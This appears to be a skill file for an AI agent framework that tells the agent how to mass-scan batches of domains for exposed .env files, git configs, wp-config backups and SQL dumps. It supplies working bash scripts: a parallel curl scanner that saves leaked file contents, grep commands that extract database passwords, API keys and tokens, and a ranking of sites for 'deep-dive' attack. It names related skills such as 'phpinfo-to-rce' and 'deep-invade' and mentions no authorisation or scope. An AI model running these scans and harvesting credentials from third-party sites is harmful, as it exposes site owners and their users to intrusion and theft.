---
name: source-leak-hunt
description: Mass scan for exposed env files, backups, and git configs.
version: 1.0.0
author: uphiago
license: MIT
platforms: [linux]
compatibility: Requires curl, nmap, python3, masscan, subfinder, httpx, nuclei
metadata:
  hermes:
    tags: [recon, source-leak, exposure, secrets, wordpress]
    category: recon
    related_skills:
      - wp-mass-recon
      - js-secrets-extraction
      - error-log-mining
      - phpinfo-to-rce
      - deep-invade
---

# Source Leak Hunt Skill

Mass scanning for exposed sensitive files (`.env`, `.git/config`, `wp-config.php.bak`, `debug.log`, `backup.sql`, `phpinfo.php`, `Dockerfile`, etc.) with content-based false positive filtering. Source leaks are the second most common finding (~7% of targets) after WordPress user enumeration.

## When to Use

- After `wp-mass-recon` confirms a target is alive.
- Broad scanning across a batch of domains.
- When probing for credential exposure that enables deeper access.
- Complementing `js-secrets-extraction` for client-side secrets.

## Prerequisites

- `terminal` tool with curl.
- List of live URLs (output from httpx or wp-mass-recon Phase 1).
- Persistence: output directory at `/root/output/leaks/`.

## How to Run

```bash
# Quick scan single target (20 paths)
TARGET="https://example.com"
for path in .env .git/config wp-config.php.bak debug.log backup.sql info.php phpinfo.php \
  .env.backup .env.local .env.production wp-config.php~ .git/HEAD .backup.sql \
  docker-compose.yml Dockerfile .DS_Store robots.txt sitemap.xml; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "$TARGET/$path")
  [[ "$code" == "200" ]] && echo "HTTP 200: $TARGET/$path"
done
```

## Quick Reference

| Path | What It Exposes | Severity |
|------|----------------|----------|
| `.env` | DB creds, API keys, app secrets | Critical |
| `wp-config.php.bak` | MySQL root password, salts | Critical |
| `.git/config` | Repository URL, credentials | High |
| `debug.log` | PHP errors, server paths, SQL queries | High |
| `backup.sql` | Full database dump | Critical |
| `info.php` / `phpinfo.php` | PHP config, disable_functions, server env | High |
| `docker-compose.yml` | Service architecture, env vars | Medium |
| `Dockerfile` | Build config, exposed ports | Low |
| `.env.backup` / `.env.local` | Same as .env, alternate names | Critical |
| `wp-config.php~` | Vim swap of wp-config | Critical |
| `.DS_Store` | Directory listing (macOS) | Low |
| `error_log` | PHP error log (can be multi-MB, full of paths/queries) | High |

## Procedure

### Step 1 — Parallel Mass Scan

```bash
#!/bin/bash
URLS_FILE="$1"   # One URL per line
OUTDIR="/root/output/leaks"
mkdir -p "$OUTDIR"

PATHS=(
  ".env"
  ".git/config"
  "wp-config.php.bak"
  "debug.log"
  "backup.sql"
  "info.php"
  "phpinfo.php"
  ".env.backup"
  ".env.local"
  ".env.production"
  "wp-config.php~"
  ".git/HEAD"
  "docker-compose.yml"
  "Dockerfile"
  ".DS_Store"
  "robots.txt"
  "sitemap.xml"
  "error_log"
  "wp-content/debug.log"
  ".backup.sql"
)

# Content verification patterns (avoids SPA catch-all false positives)
declare -A PATTERNS
PATTERNS[".env"]='DB_|APP_|_KEY|_SECRET|DATABASE|PASSWORD|TOKEN'
PATTERNS["wp-config.php.bak"]='DB_NAME|DB_PASSWORD|AUTH_KEY'
PATTERNS[".git/config"]='\[core\]'
PATTERNS["debug.log"]='PHP|ERROR|WARNING|Stack trace'
PATTERNS["backup.sql"]='CREATE TABLE|INSERT INTO|DROP TABLE'
PATTERNS["info.php"]='PHP Version|phpinfo'
PATTERNS["phpinfo.php"]='PHP Version|phpinfo'
PATTERNS[".env.backup"]='DB_|APP_|_KEY|_SECRET'
PATTERNS[".env.local"]='DB_|APP_|_KEY|_SECRET'
PATTERNS[".env.production"]='DB_|APP_|_KEY|_SECRET'
PATTERNS["wp-config.php~"]='DB_NAME|DB_PASSWORD'
PATTERNS["error_log"]='PHP|ERROR|Stack trace'

scan_target() {
  local url="$1"
  local domain
  domain=$(echo "$url" | sed 's|https\?://||' | sed 's|/.*||')

  for path in "${PATHS[@]}"; do
    local full_url="${url}/${path}"
    local code
    code=$(curl -sk -o /tmp/leak_check_$$.tmp -w "%{http_code}" --max-time 5 "$full_url" 2>/dev/null)

    if [[ "$code" == "200" ]]; then
      local content
      content=$(head -c 2000 /tmp/leak_check_$$.tmp 2>/dev/null)
      local pattern="${PATTERNS[$path]}"

      if [[ -n "$pattern" ]] && echo "$content" | grep -qiE "$pattern"; then
        echo "[LEAK] $full_url (VERIFIED: $path)"
        echo "$full_url" >> "$OUTDIR/${domain}_leaks.txt"
        cp /tmp/leak_check_$$.tmp "$OUTDIR/${domain}_${path//\//_}.content" 2>/dev/null
      elif [[ -z "$pattern" ]]; then
        # No pattern check — just log HTTP 200 (e.g., robots.txt)
        local size=$(wc -c < /tmp/leak_check_$$.tmp)
        if [[ "$size" -gt 50 ]]; then
          echo "[INFO] $full_url (HTTP 200, ${size} bytes)"
          echo "$full_url" >> "$OUTDIR/${domain}_leaks.txt"
        fi
      fi
    fi
  done
  rm -f /tmp/leak_check_$$.tmp
}

export -f scan_target
export OUTDIR
export PATHS

# Run 30 parallel workers
cat "$URLS_FILE" | xargs -P 30 -I {} bash -c 'scan_target "{}"'

echo "[+] Done. Results in $OUTDIR/"
```

### Step 2 — Extract Credentials from Leaked Files

```bash
# From .env files
grep -rhE '(DB_|APP_|_KEY|_SECRET|DATABASE|PASSWORD|TOKEN|SECRET)=' /root/output/leaks/*.env*.content 2>/dev/null | sort -u

# From wp-config backups
grep -rhE 'DB_NAME|DB_USER|DB_PASSWORD|DB_HOST|AUTH_KEY' /root/output/leaks/*wp-config* 2>/dev/null

# From .git/config
grep -rh 'url = ' /root/output/leaks/*.git_config.content 2>/dev/null

# From SQL dumps
grep -rhE 'CREATE TABLE|INSERT INTO' /root/output/leaks/*backup* /root/output/leaks/*.sql* 2>/dev/null | head -20
```

### Step 3 — Find Targets with Multiple Leaks (Deep-Dive Candidates)

```bash
for f in /root/output/leaks/*_leaks.txt; do
  count=$(wc -l < "$f")
  [[ "$count" -ge 3 ]] && echo "$(basename "$f" _leaks.txt): $count leaks"
done | sort -t: -k2 -rn
```

## Pitfalls

- **SPA catch-all false positives over 70% of results without filtering.** Single-page apps return HTTP 200 with index.html for any path. Content verification is mandatory.
- **CloudFront/S3 error pages.** Some CDNs return 200 with an XML error body for missing files. Check content type and body.
- **Truncated content on large files.** `error_log` files can be 1.7MB+. Fetch in chunks or use `curl -r 0-5000` for sampling.
- **git/HEAD false positive.** Some themes/setups have `.git/HEAD` returning 200 with a legitimate git hash. Verify `.git/config` first.
- **Parked/for-sale domains return HTTP 200 for every path.** Generic parking pages serve content for /.env, /.git/config, /info.php, etc. with no error handling — every path returns 200 with the same landing page. Detect these by checking if multiple unrelated paths return identical content (same body hash, same `<title>`, or same keyword like "for sale" or "parked"). Add early-exit: if /robots.txt and /.env both return 200 with near-identical HTML, mark domain as parked and skip further source-leak checks.

## Verification

- Every `.env` leak MUST contain at least one of: `DB_`, `APP_`, `_KEY`, `_SECRET`, `PASSWORD`, `TOKEN`.
- Every `wp-config.php.bak` leak MUST contain `DB_NAME` and `DB_PASSWORD`.
- Every `.git/config` leak MUST contain `[core]` section header.
- Every SQL backup MUST contain DDL (`CREATE TABLE`) or DML (`INSERT INTO`) statements.
- Log all verified leaks with timestamp and HTTP response size.
